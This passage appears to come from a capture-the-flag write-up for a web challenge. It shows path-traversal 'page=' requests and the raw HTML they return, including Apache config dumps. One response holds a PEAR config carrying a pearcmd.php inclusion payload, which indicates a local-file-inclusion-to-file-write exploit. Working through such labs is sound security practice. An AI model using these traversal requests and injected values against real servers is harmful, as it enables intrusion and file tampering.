<div class="grange">ERIOUS? WHY SO SERIOUS? WHY</div> <div class="rhino">S</div><div class="clayface">O</div><div class="catwoman">S</div><div class="blaze">E</div><div class="black-mask">R</div><div class="alfred">I</div><div class="ellen-yin">O</div><div class="chief-angel">U</div><div class="trio">S? WHY SO SE</div><div class="nightwish">R</div><div class="dick-grayson">I</div><div class="thorne">O</div><div class="marty">U</div><div class="sinestro">S</div><div class="robin">?</div><div class="james-gordon">W</div><div class="barbara-gordon">H</div><div class="grange">Y SO SERIOUS? WHY SO SERIOUS?</div><br><!-- 9 -->

<div class="grange">WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="batgirl">Y</div><div class="bat-30">S</div><div class="bat-31">O</div><div class="trio">SERIOUS</div><div class="bat-32">?</div><div class="bat-33">W</div><div class="bat-34">H</div><div class="barbara-gordon">Y</div><div class="grange"> SO SERIOUS? WHY SO SERIOUS? WHY SO</div><br><!-- 10 -->

<div class="grange">SERIOUS? WHY SO SERIOUS? WHY SO SERIO</div><div class="rhino">U</div><div class="bat-35">S</div><div class="bat-36">?</div><div class="harley-quinn">W</div><div class="trio">H</div><div class="bat-37">Y</div><div class="bat-38">S</div><div class="bat-35">O</div><div class="grange"> SERIOUS? WHY SO SERIOUS? WHY SO SERIOU</div><br><!-- 11 -->

<div class="grange">S? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO</div><div class="bat-39">S</div><div class="bat-40">E</div><div class="bat-41">R</div><div class="batgirl">I</div><div class="grange">OUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY</div> <br><!-- 12 -->

<div class="grange">SO SERIOUS?WHY SO SERIOUS? WHYSOSERIOUS</div><div class="riddler">?</div><div class="bat-42">W</div><div class="grange">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><br><!-- 13 -->

  

<p>Credits: <a href="[https://codepen.io/cjv/pen/xwXoBW](https://codepen.io/cjv/pen/xwXoBW)">https://codepen.io/cjv/pen/xwXoBW</a></p>

</div>

  

</body>

<script>

let message = `
```

view-source:http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../tmp/hi.php
```
  

<!--

\ /| |\ / /~~ /~~\ /~~ |~~ |~~\| /~~\ | |/~~

\ /\ / |---| \ / |__ | | |__ |-- |__/|| || ||__

\/ \/ | | | ___| \__/ ___||__ | \| \__/ \_/ ___|

-->

<html lang="en">

<head>

<meta charset="UTF-8">

<title>Why So Serious</title>

<link rel="stylesheet" href="[main.css](http://sourcelessguessyweb.chall.seetf.sg:1337/main.css)">

</head>

<body>

<div class="lazarus-pit">

<h1>WHY SO SERIOUS?</h1>

<a href="[phpinfo.php#:~:text=register_argc_argv](http://sourcelessguessyweb.chall.seetf.sg:1337/phpinfo.php#:~:text=register_argc_argv)" target="_blank">WHY NEED SOURCE?</a>

<p>RIDDLE ME THIS... WHAT'S THE FLAG?</p>

  

<div class="penguin">W</div><div class="vicki-vale">H</div><div class="cash">Y</div><div class="superman">S</div><div class="manhunter">O</div> <div class="superman">SERIOUS?</div> <div class="hawkman">WHY SO SERIO</div><div class="lantern">U</div><div class="arrow">S</div> <div class="grange">? WHY SO SERIOUS? WHY SO SE</div><div class="flash">R</div><div class="marion">I</div><div class="zucco">OUS? WHY SO SE</div><div class="tony">RIOUS? W</div><div class="zucco">H</div><div class="maxie">Y</div><div class="zeus">S</div><div class="wrath">O</div> <br> <!-- 1 -->

<div class="grange">S</div><div class="ventriloquist">E</div><div class="toyman">R</div><div class="zeus">I</div><div class="toymaker">O</div><div class="rupert">U</div><div class="thorne">S</div><div class="terrible">?</div> <div class="trio">WHY SO SERIOUS? WHY</div> <div class="temblor">S</div><div class="hugo">O</div> <div class="grange">SERIOUS?</div><div class="strange">W</div><div class="grange">HY</div> <div class="spellbinder">S</div><div class="grange">O SERIOUS?</div><div class="solomon">W</div><div class="trio">HY SO SERIOUS? WHY SO</div><div class="grundy">S</div><div class="smoke">E</div><div class="sinestro">R</div><div class="shadow">I</div><div class="thief">O</div><div class="penguin">U</div><div class="grange">S</div> <br><!-- 2 -->

<div class="grange">? WHY</div> <div class="scorn">S</div><div class="bat-one">O</div><div class="rumor">S</div><div class="bat-two">E</div><div class="trio">RIOUS? WHY SO SERIO</div><div class="bat-three">U</div><div class="bat-four">S</div><div class="bat-five">?</div><div class="bat-six">W</div><div class="riddler">H</div><div class="grange">Y SO</div><div class="bat-seven">S</div><div class="rumor">E</div><div class="bat-eight">R</div><div class="bat-nine">I</div><div class="riddlemen">O</div><div class="bat-ten">U</div><div class="grange">S? W</div><div class="rhino">H</div><div class="bat-eleven">Y</div><div class="bat-twelve">S</div><div class="bat-thirteen">O</div><div class="trio">SERIOUS? WHY SO SER</div><div class="bat-fourteen">I</div><div class="bat-fifteen">O</div><div class="bat-sixteen">U</div><div class="bat-seventeen">S</div><div class="spellbinder">?</div> <div class="grange">WHY S</div><br><!-- 3 -->

<div class="grange">O SERIOUS?</div><div class="mugsy">W</div><div class="bat-eighteen">H</div><div class="trio">Y SO SERIOUS? WHY S</div><div class="ragdoll">O</div><div class="bat-nineteen">S</div><div class="bat-twenty">E</div><div class="trio">RIOUS? WHYSOSERIOUS? WHY SO SERIOUS?</div><div class="bat-twentyone">W</div><div class="bat-twentytwo">H</div><div class="grange">Y SO SERIO</div><br><!-- 4 -->

<div class="grange">US? WHY SO</div> <div class="riddler">S</div><div class="bat-twentythree">E</div><div class="bat-twenty-four">R</div><div class="trio">IOUS? WHY SO SERIOUS?</div> <div class="joker">WHY SO SERIOUS?</div> <div class="trio">WHY SO SERIOUS? WHY S</div><div class="bat-twentyfive">O</div><div class="riddler">S</div><div class="grange">ERIOUS? WHY</div><br><!-- 5 -->

<div class="grange">SO SERIOUS?</div> <div class="bat-twentysix">W</div><div class="trio">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><div class="punch">O</div><div class="judy">U</div><div class="grange">S? WHY SO SER</div><br><!-- 6 -->

<div class="grange">IOUS?WHY SO</div> <div class="prank">S</div><div class="trio">ERIOUS?WHYSO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="poison-ivy">Y</div><div class="grange">SO SERIOUS?W</div><br>

<div class="grange">HY SO SERIOUS</div><div class="mister-freeze">?</div><div class="rupert">W</div><div class="mirror-master">H</div><div class="mettalo">Y</div><div class="marty">S</div><div class="man-bat">O</div><div class="lex-luthor">S</div><div class="killer-moth">E</div><div class="killer-croc">R</div><div class="hideto-katsu">I</div><div class="kabuki-twins">O</div><div class="joker-v2">U</div><div class="ragdoll">S</div><div class="the-joining">?</div><div class="harley-quinn">W</div><div class="trio">HY SO SERIOUS? WHY SO</div> <div class="harley-quinn">S</div><div class="francis-grey">E</div><div class="the-joining">R</div><div class="mercy-graves">I</div><div class="riddlemen">O</div><div class="gearhead">U</div><div class="firefly">S</div><div class="everywhere-man">?</div><div class="dracula">W</div><div class="dave">H</div><div class="count-vertigo">Y</div><div class="mugsy">S</div><div class="cluemaster">O</div> <div class="mugsy">S</div><div class="mettalo">E</div><div class="mirror-master">R</div><div class="arrow">I</div><div class="grange">OUS? WHY SO S</div><br><!-- 8 -->

<div class="grange">ERIOUS? WHY SO SERIOUS? WHY</div> <div class="rhino">S</div><div class="clayface">O</div><div class="catwoman">S</div><div class="blaze">E</div><div class="black-mask">R</div><div class="alfred">I</div><div class="ellen-yin">O</div><div class="chief-angel">U</div><div class="trio">S? WHY SO SE</div><div class="nightwish">R</div><div class="dick-grayson">I</div><div class="thorne">O</div><div class="marty">U</div><div class="sinestro">S</div><div class="robin">?</div><div class="james-gordon">W</div><div class="barbara-gordon">H</div><div class="grange">Y SO SERIOUS? WHY SO SERIOUS?</div><br><!-- 9 -->

<div class="grange">WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="batgirl">Y</div><div class="bat-30">S</div><div class="bat-31">O</div><div class="trio">SERIOUS</div><div class="bat-32">?</div><div class="bat-33">W</div><div class="bat-34">H</div><div class="barbara-gordon">Y</div><div class="grange"> SO SERIOUS? WHY SO SERIOUS? WHY SO</div><br><!-- 10 -->

<div class="grange">SERIOUS? WHY SO SERIOUS? WHY SO SERIO</div><div class="rhino">U</div><div class="bat-35">S</div><div class="bat-36">?</div><div class="harley-quinn">W</div><div class="trio">H</div><div class="bat-37">Y</div><div class="bat-38">S</div><div class="bat-35">O</div><div class="grange"> SERIOUS? WHY SO SERIOUS? WHY SO SERIOU</div><br><!-- 11 -->

<div class="grange">S? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO</div><div class="bat-39">S</div><div class="bat-40">E</div><div class="bat-41">R</div><div class="batgirl">I</div><div class="grange">OUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY</div> <br><!-- 12 -->

<div class="grange">SO SERIOUS?WHY SO SERIOUS? WHYSOSERIOUS</div><div class="riddler">?</div><div class="bat-42">W</div><div class="grange">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><br><!-- 13 -->

  

<p>Credits: <a href="[https://codepen.io/cjv/pen/xwXoBW](https://codepen.io/cjv/pen/xwXoBW)">https://codepen.io/cjv/pen/xwXoBW</a></p>

</div>

  

</body>

<script>

let message = `

#PEAR_Config 0.9

a:12:{s:7:"php_dir";s:79:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php

main.css

phpinfo.php

whysoserious

whysoserious/pear/php";s:8:"data_dir";s:80:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php

main.css

phpinfo.php

whysoserious

whysoserious/pear/data";s:7:"www_dir";s:79:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php

main.css

phpinfo.php

whysoserious

whysoserious/pear/www";s:7:"cfg_dir";s:79:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php

main.css

phpinfo.php

whysoserious

whysoserious/pear/cfg";s:7:"ext_dir";s:79:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php

main.css

phpinfo.php

whysoserious

whysoserious/pear/ext";s:7:"doc_dir";s:80:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php

main.css

phpinfo.php

whysoserious

whysoserious/pear/docs";s:8:"test_dir";s:81:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php

main.css

phpinfo.php

whysoserious

whysoserious/pear/tests";s:9:"cache_dir";s:81:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php

main.css

phpinfo.php

whysoserious

whysoserious/pear/cache";s:12:"download_dir";s:84:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php

main.css

phpinfo.php

whysoserious

whysoserious/pear/download";s:8:"temp_dir";s:80:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php

main.css

phpinfo.php

whysoserious

whysoserious/pear/temp";s:7:"bin_dir";s:75:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php

main.css

phpinfo.php

whysoserious

whysoserious/pear";s:7:"man_dir";s:79:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php

main.css

phpinfo.php

whysoserious

whysoserious/pear/man";} `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();

  

if (message) {

let currIdx = 0;

let messageLength = message.length;

  

let parts = document.querySelectorAll('.lazarus-pit > div');

for (let i = 0; i < parts.length; i++) {

let partLength = parts[i].innerHTML.length;

  

parts[i].innerHTML = '';

  

for (let j = 0; j < partLength; j++) {

parts[i].innerHTML += message[currIdx % messageLength];

currIdx++;

}

}

}

</script>

</html>
```

view-source:http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../etc/apache2/sites-enabled/000-default.conf
```
  

<!--

\ /| |\ / /~~ /~~\ /~~ |~~ |~~\| /~~\ | |/~~

\ /\ / |---| \ / |__ | | |__ |-- |__/|| || ||__

\/ \/ | | | ___| \__/ ___||__ | \| \__/ \_/ ___|

-->

<html lang="en">

<head>

<meta charset="UTF-8">

<title>Why So Serious</title>

<link rel="stylesheet" href="[main.css](http://sourcelessguessyweb.chall.seetf.sg:1337/main.css)">

</head>

<body>

<div class="lazarus-pit">

<h1>WHY SO SERIOUS?</h1>

<a href="[phpinfo.php#:~:text=register_argc_argv](http://sourcelessguessyweb.chall.seetf.sg:1337/phpinfo.php#:~:text=register_argc_argv)" target="_blank">WHY NEED SOURCE?</a>

<p>RIDDLE ME THIS... WHAT'S THE FLAG?</p>

  

<div class="penguin">W</div><div class="vicki-vale">H</div><div class="cash">Y</div><div class="superman">S</div><div class="manhunter">O</div> <div class="superman">SERIOUS?</div> <div class="hawkman">WHY SO SERIO</div><div class="lantern">U</div><div class="arrow">S</div> <div class="grange">? WHY SO SERIOUS? WHY SO SE</div><div class="flash">R</div><div class="marion">I</div><div class="zucco">OUS? WHY SO SE</div><div class="tony">RIOUS? W</div><div class="zucco">H</div><div class="maxie">Y</div><div class="zeus">S</div><div class="wrath">O</div> <br> <!-- 1 -->

<div class="grange">S</div><div class="ventriloquist">E</div><div class="toyman">R</div><div class="zeus">I</div><div class="toymaker">O</div><div class="rupert">U</div><div class="thorne">S</div><div class="terrible">?</div> <div class="trio">WHY SO SERIOUS? WHY</div> <div class="temblor">S</div><div class="hugo">O</div> <div class="grange">SERIOUS?</div><div class="strange">W</div><div class="grange">HY</div> <div class="spellbinder">S</div><div class="grange">O SERIOUS?</div><div class="solomon">W</div><div class="trio">HY SO SERIOUS? WHY SO</div><div class="grundy">S</div><div class="smoke">E</div><div class="sinestro">R</div><div class="shadow">I</div><div class="thief">O</div><div class="penguin">U</div><div class="grange">S</div> <br><!-- 2 -->

<div class="grange">? WHY</div> <div class="scorn">S</div><div class="bat-one">O</div><div class="rumor">S</div><div class="bat-two">E</div><div class="trio">RIOUS? WHY SO SERIO</div><div class="bat-three">U</div><div class="bat-four">S</div><div class="bat-five">?</div><div class="bat-six">W</div><div class="riddler">H</div><div class="grange">Y SO</div><div class="bat-seven">S</div><div class="rumor">E</div><div class="bat-eight">R</div><div class="bat-nine">I</div><div class="riddlemen">O</div><div class="bat-ten">U</div><div class="grange">S? W</div><div class="rhino">H</div><div class="bat-eleven">Y</div><div class="bat-twelve">S</div><div class="bat-thirteen">O</div><div class="trio">SERIOUS? WHY SO SER</div><div class="bat-fourteen">I</div><div class="bat-fifteen">O</div><div class="bat-sixteen">U</div><div class="bat-seventeen">S</div><div class="spellbinder">?</div> <div class="grange">WHY S</div><br><!-- 3 -->

<div class="grange">O SERIOUS?</div><div class="mugsy">W</div><div class="bat-eighteen">H</div><div class="trio">Y SO SERIOUS? WHY S</div><div class="ragdoll">O</div><div class="bat-nineteen">S</div><div class="bat-twenty">E</div><div class="trio">RIOUS? WHYSOSERIOUS? WHY SO SERIOUS?</div><div class="bat-twentyone">W</div><div class="bat-twentytwo">H</div><div class="grange">Y SO SERIO</div><br><!-- 4 -->

<div class="grange">US? WHY SO</div> <div class="riddler">S</div><div class="bat-twentythree">E</div><div class="bat-twenty-four">R</div><div class="trio">IOUS? WHY SO SERIOUS?</div> <div class="joker">WHY SO SERIOUS?</div> <div class="trio">WHY SO SERIOUS? WHY S</div><div class="bat-twentyfive">O</div><div class="riddler">S</div><div class="grange">ERIOUS? WHY</div><br><!-- 5 -->

<div class="grange">SO SERIOUS?</div> <div class="bat-twentysix">W</div><div class="trio">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><div class="punch">O</div><div class="judy">U</div><div class="grange">S? WHY SO SER</div><br><!-- 6 -->

<div class="grange">IOUS?WHY SO</div> <div class="prank">S</div><div class="trio">ERIOUS?WHYSO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="poison-ivy">Y</div><div class="grange">SO SERIOUS?W</div><br>

<div class="grange">HY SO SERIOUS</div><div class="mister-freeze">?</div><div class="rupert">W</div><div class="mirror-master">H</div><div class="mettalo">Y</div><div class="marty">S</div><div class="man-bat">O</div><div class="lex-luthor">S</div><div class="killer-moth">E</div><div class="killer-croc">R</div><div class="hideto-katsu">I</div><div class="kabuki-twins">O</div><div class="joker-v2">U</div><div class="ragdoll">S</div><div class="the-joining">?</div><div class="harley-quinn">W</div><div class="trio">HY SO SERIOUS? WHY SO</div> <div class="harley-quinn">S</div><div class="francis-grey">E</div><div class="the-joining">R</div><div class="mercy-graves">I</div><div class="riddlemen">O</div><div class="gearhead">U</div><div class="firefly">S</div><div class="everywhere-man">?</div><div class="dracula">W</div><div class="dave">H</div><div class="count-vertigo">Y</div><div class="mugsy">S</div><div class="cluemaster">O</div> <div class="mugsy">S</div><div class="mettalo">E</div><div class="mirror-master">R</div><div class="arrow">I</div><div class="grange">OUS? WHY SO S</div><br><!-- 8 -->

<div class="grange">ERIOUS? WHY SO SERIOUS? WHY</div> <div class="rhino">S</div><div class="clayface">O</div><div class="catwoman">S</div><div class="blaze">E</div><div class="black-mask">R</div><div class="alfred">I</div><div class="ellen-yin">O</div><div class="chief-angel">U</div><div class="trio">S? WHY SO SE</div><div class="nightwish">R</div><div class="dick-grayson">I</div><div class="thorne">O</div><div class="marty">U</div><div class="sinestro">S</div><div class="robin">?</div><div class="james-gordon">W</div><div class="barbara-gordon">H</div><div class="grange">Y SO SERIOUS? WHY SO SERIOUS?</div><br><!-- 9 -->

<div class="grange">WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="batgirl">Y</div><div class="bat-30">S</div><div class="bat-31">O</div><div class="trio">SERIOUS</div><div class="bat-32">?</div><div class="bat-33">W</div><div class="bat-34">H</div><div class="barbara-gordon">Y</div><div class="grange"> SO SERIOUS? WHY SO SERIOUS? WHY SO</div><br><!-- 10 -->

<div class="grange">SERIOUS? WHY SO SERIOUS? WHY SO SERIO</div><div class="rhino">U</div><div class="bat-35">S</div><div class="bat-36">?</div><div class="harley-quinn">W</div><div class="trio">H</div><div class="bat-37">Y</div><div class="bat-38">S</div><div class="bat-35">O</div><div class="grange"> SERIOUS? WHY SO SERIOUS? WHY SO SERIOU</div><br><!-- 11 -->

<div class="grange">S? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO</div><div class="bat-39">S</div><div class="bat-40">E</div><div class="bat-41">R</div><div class="batgirl">I</div><div class="grange">OUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY</div> <br><!-- 12 -->

<div class="grange">SO SERIOUS?WHY SO SERIOUS? WHYSOSERIOUS</div><div class="riddler">?</div><div class="bat-42">W</div><div class="grange">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><br><!-- 13 -->

  

<p>Credits: <a href="[https://codepen.io/cjv/pen/xwXoBW](https://codepen.io/cjv/pen/xwXoBW)">https://codepen.io/cjv/pen/xwXoBW</a></p>

</div>

  

</body>

<script>

let message = `

<VirtualHost *:80>

# The ServerName directive sets the request scheme, hostname and port that

# the server uses to identify itself. This is used when creating

# redirection URLs. In the context of virtual hosts, the ServerName

# specifies what hostname must appear in the request's Host: header to

# match this virtual host. For the default virtual host (this file) this

# value is not decisive as it is used as a last resort host regardless.

# However, you must set it for any further virtual host explicitly.

#ServerName www.example.com

  

ServerAdmin webmaster@localhost

DocumentRoot /var/www/html

  

# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,

# error, crit, alert, emerg.

# It is also possible to configure the loglevel for particular

# modules, e.g.

#LogLevel info ssl:warn

  

ErrorLog ${APACHE_LOG_DIR}/error.log

CustomLog ${APACHE_LOG_DIR}/access.log combined

  

# For most configuration files from conf-available/, which are

# enabled or disabled at a global level, it is possible to

# include a line for only one particular virtual host. For example the

# following line enables the CGI configuration for this host only

# after it has been globally disabled with "a2disconf".

#Include conf-available/serve-cgi-bin.conf

</VirtualHost>

  

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

`.replace(/[^A-Za-z0-9!?]/g, ' ').trim();

  

if (message) {

let currIdx = 0;

let messageLength = message.length;

  

let parts = document.querySelectorAll('.lazarus-pit > div');

for (let i = 0; i < parts.length; i++) {

let partLength = parts[i].innerHTML.length;

  

parts[i].innerHTML = '';

  

for (let j = 0; j < partLength; j++) {

parts[i].innerHTML += message[currIdx % messageLength];

currIdx++;

}

}

}

</script>

</html>```

view-source:http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../etc/apache2/apache2.conf

```
  

<!--

\ /| |\ / /~~ /~~\ /~~ |~~ |~~\| /~~\ | |/~~

\ /\ / |---| \ / |__ | | |__ |-- |__/|| || ||__

\/ \/ | | | ___| \__/ ___||__ | \| \__/ \_/ ___|

-->

<html lang="en">

<head>

<meta charset="UTF-8">

<title>Why So Serious</title>

<link rel="stylesheet" href="[main.css](http://sourcelessguessyweb.chall.seetf.sg:1337/main.css)">

</head>

<body>

<div class="lazarus-pit">

<h1>WHY SO SERIOUS?</h1>

<a href="[phpinfo.php#:~:text=register_argc_argv](http://sourcelessguessyweb.chall.seetf.sg:1337/phpinfo.php#:~:text=register_argc_argv)" target="_blank">WHY NEED SOURCE?</a>

<p>RIDDLE ME THIS... WHAT'S THE FLAG?</p>

  

<div class="penguin">W</div><div class="vicki-vale">H</div><div class="cash">Y</div><div class="superman">S</div><div class="manhunter">O</div> <div class="superman">SERIOUS?</div> <div class="hawkman">WHY SO SERIO</div><div class="lantern">U</div><div class="arrow">S</div> <div class="grange">? WHY SO SERIOUS? WHY SO SE</div><div class="flash">R</div><div class="marion">I</div><div class="zucco">OUS? WHY SO SE</div><div class="tony">RIOUS? W</div><div class="zucco">H</div><div class="maxie">Y</div><div class="zeus">S</div><div class="wrath">O</div> <br> <!-- 1 -->

<div class="grange">S</div><div class="ventriloquist">E</div><div class="toyman">R</div><div class="zeus">I</div><div class="toymaker">O</div><div class="rupert">U</div><div class="thorne">S</div><div class="terrible">?</div> <div class="trio">WHY SO SERIOUS? WHY</div> <div class="temblor">S</div><div class="hugo">O</div> <div class="grange">SERIOUS?</div><div class="strange">W</div><div class="grange">HY</div> <div class="spellbinder">S</div><div class="grange">O SERIOUS?</div><div class="solomon">W</div><div class="trio">HY SO SERIOUS? WHY SO</div><div class="grundy">S</div><div class="smoke">E</div><div class="sinestro">R</div><div class="shadow">I</div><div class="thief">O</div><div class="penguin">U</div><div class="grange">S</div> <br><!-- 2 -->

<div class="grange">? WHY</div> <div class="scorn">S</div><div class="bat-one">O</div><div class="rumor">S</div><div class="bat-two">E</div><div class="trio">RIOUS? WHY SO SERIO</div><div class="bat-three">U</div><div class="bat-four">S</div><div class="bat-five">?</div><div class="bat-six">W</div><div class="riddler">H</div><div class="grange">Y SO</div><div class="bat-seven">S</div><div class="rumor">E</div><div class="bat-eight">R</div><div class="bat-nine">I</div><div class="riddlemen">O</div><div class="bat-ten">U</div><div class="grange">S? W</div><div class="rhino">H</div><div class="bat-eleven">Y</div><div class="bat-twelve">S</div><div class="bat-thirteen">O</div><div class="trio">SERIOUS? WHY SO SER</div><div class="bat-fourteen">I</div><div class="bat-fifteen">O</div><div class="bat-sixteen">U</div><div class="bat-seventeen">S</div><div class="spellbinder">?</div> <div class="grange">WHY S</div><br><!-- 3 -->

<div class="grange">O SERIOUS?</div><div class="mugsy">W</div><div class="bat-eighteen">H</div><div class="trio">Y SO SERIOUS? WHY S</div><div class="ragdoll">O</div><div class="bat-nineteen">S</div><div class="bat-twenty">E</div><div class="trio">RIOUS? WHYSOSERIOUS? WHY SO SERIOUS?</div><div class="bat-twentyone">W</div><div class="bat-twentytwo">H</div><div class="grange">Y SO SERIO</div><br><!-- 4 -->

<div class="grange">US? WHY SO</div> <div class="riddler">S</div><div class="bat-twentythree">E</div><div class="bat-twenty-four">R</div><div class="trio">IOUS? WHY SO SERIOUS?</div> <div class="joker">WHY SO SERIOUS?</div> <div class="trio">WHY SO SERIOUS? WHY S</div><div class="bat-twentyfive">O</div><div class="riddler">S</div><div class="grange">ERIOUS? WHY</div><br><!-- 5 -->

<div class="grange">SO SERIOUS?</div> <div class="bat-twentysix">W</div><div class="trio">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><div class="punch">O</div><div class="judy">U</div><div class="grange">S? WHY SO SER</div><br><!-- 6 -->

<div class="grange">IOUS?WHY SO</div> <div class="prank">S</div><div class="trio">ERIOUS?WHYSO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="poison-ivy">Y</div><div class="grange">SO SERIOUS?W</div><br>

<div class="grange">HY SO SERIOUS</div><div class="mister-freeze">?</div><div class="rupert">W</div><div class="mirror-master">H</div><div class="mettalo">Y</div><div class="marty">S</div><div class="man-bat">O</div><div class="lex-luthor">S</div><div class="killer-moth">E</div><div class="killer-croc">R</div><div class="hideto-katsu">I</div><div class="kabuki-twins">O</div><div class="joker-v2">U</div><div class="ragdoll">S</div><div class="the-joining">?</div><div class="harley-quinn">W</div><div class="trio">HY SO SERIOUS? WHY SO</div> <div class="harley-quinn">S</div><div class="francis-grey">E</div><div class="the-joining">R</div><div class="mercy-graves">I</div><div class="riddlemen">O</div><div class="gearhead">U</div><div class="firefly">S</div><div class="everywhere-man">?</div><div class="dracula">W</div><div class="dave">H</div><div class="count-vertigo">Y</div><div class="mugsy">S</div><div class="cluemaster">O</div> <div class="mugsy">S</div><div class="mettalo">E</div><div class="mirror-master">R</div><div class="arrow">I</div><div class="grange">OUS? WHY SO S</div><br><!-- 8 -->

<div class="grange">ERIOUS? WHY SO SERIOUS? WHY</div> <div class="rhino">S</div><div class="clayface">O</div><div class="catwoman">S</div><div class="blaze">E</div><div class="black-mask">R</div><div class="alfred">I</div><div class="ellen-yin">O</div><div class="chief-angel">U</div><div class="trio">S? WHY SO SE</div><div class="nightwish">R</div><div class="dick-grayson">I</div><div class="thorne">O</div><div class="marty">U</div><div class="sinestro">S</div><div class="robin">?</div><div class="james-gordon">W</div><div class="barbara-gordon">H</div><div class="grange">Y SO SERIOUS? WHY SO SERIOUS?</div><br><!-- 9 -->

<div class="grange">WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="batgirl">Y</div><div class="bat-30">S</div><div class="bat-31">O</div><div class="trio">SERIOUS</div><div class="bat-32">?</div><div class="bat-33">W</div><div class="bat-34">H</div><div class="barbara-gordon">Y</div><div class="grange"> SO SERIOUS? WHY SO SERIOUS? WHY SO</div><br><!-- 10 -->

<div class="grange">SERIOUS? WHY SO SERIOUS? WHY SO SERIO</div><div class="rhino">U</div><div class="bat-35">S</div><div class="bat-36">?</div><div class="harley-quinn">W</div><div class="trio">H</div><div class="bat-37">Y</div><div class="bat-38">S</div><div class="bat-35">O</div><div class="grange"> SERIOUS? WHY SO SERIOUS? WHY SO SERIOU</div><br><!-- 11 -->

<div class="grange">S? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO</div><div class="bat-39">S</div><div class="bat-40">E</div><div class="bat-41">R</div><div class="batgirl">I</div><div class="grange">OUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY</div> <br><!-- 12 -->

<div class="grange">SO SERIOUS?WHY SO SERIOUS? WHYSOSERIOUS</div><div class="riddler">?</div><div class="bat-42">W</div><div class="grange">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><br><!-- 13 -->

  

<p>Credits: <a href="[https://codepen.io/cjv/pen/xwXoBW](https://codepen.io/cjv/pen/xwXoBW)">https://codepen.io/cjv/pen/xwXoBW</a></p>

</div>

  

</body>

<script>

let message = `

# This is the main Apache server configuration file. It contains the

# configuration directives that give the server its instructions.

# See http://httpd.apache.org/docs/2.4/ for detailed information about

# the directives and /usr/share/doc/apache2/README.Debian about Debian specific

# hints.

#

#

# Summary of how the Apache 2 configuration works in Debian:

# The Apache 2 web server configuration in Debian is quite different to

# upstream's suggested way to configure the web server. This is because Debian's

# default Apache2 installation attempts to make adding and removing modules,

# virtual hosts, and extra configuration directives as flexible as possible, in

# order to make automating the changes and administering the server as easy as

# possible.

  

# It is split into several files forming the configuration hierarchy outlined

# below, all located in the /etc/apache2/ directory:

#

# /etc/apache2/

# |-- apache2.conf

# | `-- ports.conf

# |-- mods-enabled

# | |-- *.load

# | `-- *.conf

# |-- conf-enabled

# | `-- *.conf

# `-- sites-enabled

# `-- *.conf

#

#

# * apache2.conf is the main configuration file (this file). It puts the pieces

# together by including all remaining configuration files when starting up the

# web server.

#

# * ports.conf is always included from the main configuration file. It is

# supposed to determine listening ports for incoming connections which can be

# customized anytime.

#

# * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/

# directories contain particular configuration snippets which manage modules,

# global configuration fragments, or virtual host configurations,

# respectively.

#

# They are activated by symlinking available configuration files from their

# respective *-available/ counterparts. These should be managed by using our

# helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See

# their respective man pages for detailed information.

#

# * The binary is called apache2. Due to the use of environment variables, in

# the default configuration, apache2 needs to be started/stopped with

# /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not

# work with the default configuration.

  

  

# Global configuration

#

  

#

# ServerRoot: The top of the directory tree under which the server's

# configuration, error, and log files are kept.

#

# NOTE! If you intend to place this on an NFS (or otherwise network)

# mounted filesystem then please read the Mutex documentation (available

# at <URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex>);

# you will save yourself a lot of trouble.

#

# Do NOT add a slash at the end of the directory path.

#

#ServerRoot "/etc/apache2"

  

#

# The accept serialization lock file MUST BE STORED ON A LOCAL DISK.

#

#Mutex file:${APACHE_LOCK_DIR} default

  

#

# The directory where shm and other runtime files will be stored.

#

  

DefaultRuntimeDir ${APACHE_RUN_DIR}

  

#

# PidFile: The file in which the server should record its process

# identification number when it starts.

# This needs to be set in /etc/apache2/envvars

#

PidFile ${APACHE_PID_FILE}

  

#

# Timeout: The number of seconds before receives and sends time out.

#

Timeout 300

  

#

# KeepAlive: Whether or not to allow persistent connections (more than

# one request per connection). Set to "Off" to deactivate.

#

KeepAlive On

  

#

